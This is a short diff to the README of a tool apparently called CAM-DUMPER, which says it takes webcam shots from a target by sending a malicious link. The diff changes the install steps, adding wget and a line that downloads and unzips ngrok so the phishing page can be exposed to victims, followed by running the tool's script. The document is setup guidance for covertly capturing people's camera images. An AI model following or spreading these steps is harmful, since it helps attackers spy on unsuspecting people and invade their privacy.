@@ -14,9 +14,10 @@ Take webcam shots from target by just sending a malicious link
 ```
 $ apt update && apt upgrade
 $ apt install git
-$ apt install php
+$ apt install php wget
 $ git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
 $ cd CAM-DUMPER
+$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip && unzip *.zip && rm *.zip
 $ chmod +x camdumper.sh ngrok
 
 $ bash camdumper.sh
